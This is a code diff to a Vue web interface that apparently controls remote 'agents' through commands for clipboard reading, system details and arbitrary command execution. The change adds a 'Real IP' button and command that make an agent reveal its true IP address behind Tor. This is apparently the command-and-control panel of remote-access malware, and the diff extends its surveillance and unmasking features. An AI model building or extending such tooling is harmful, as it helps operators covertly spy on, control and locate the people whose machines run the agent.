@@ -86,6 +86,23 @@
                             </div>
                         </v-tooltip>
                     </v-btn>
+
+                    <v-btn
+                        @click="getRealIpCommand"
+                        variant="plain"
+                        density="compact"
+                    >
+                        <v-icon icon="mdi-ip" />
+
+                        <v-tooltip activator="parent" location="top" open-delay="600">
+                            <div class="tooltip-el">
+                                <h4>Real IP</h4>
+                                Makes the agent reach out to predefined API that would return
+                                its IP address, then agent would send the IP back to us. This
+                                is useful as via Tor we can't actually know IP of an agent.
+                            </div>
+                        </v-tooltip>
+                    </v-btn>
                 </v-toolbar-items>
 
                 <v-spacer />
@@ -160,6 +177,7 @@ const terminalOutput = ref() as Ref<HTMLElement | HTMLElement>
 const terminalInput = ref() as Ref<HTMLElement | HTMLElement>
 
 const commands = {
+    REAL_IP: () => `/get-ip`,
     READ_CLIPBOARD: () => `/read-clipboard`,
     SYSTEM_DETAILS: () => `/system-details`,
     RUN_NO_AWAIT: (command: string) => `/run|${command}`,
@@ -176,6 +194,22 @@ const scrollToBottom = async () => {
         terminalOutput.value.offsetHeight // Trigger reflow
         terminalOutput.value.scrollTop = terminalOutput.value.scrollHeight
     }
+}
+
+const getRealIpCommand = async () => {
+    loading.value = true
+
+    try {
+        await API.value.sendMessage(props.agentId, commands.REAL_IP())
+        await scrollToBottom()
+    } catch(e) {
+        console.error('failed to send message:', e)
+        // TODO: Issue visual error notification.
+    } finally {
+        loading.value = false
+    }
+
+    await fetchMessages()
 }
 
 const systemDetailsCommand = async () => {
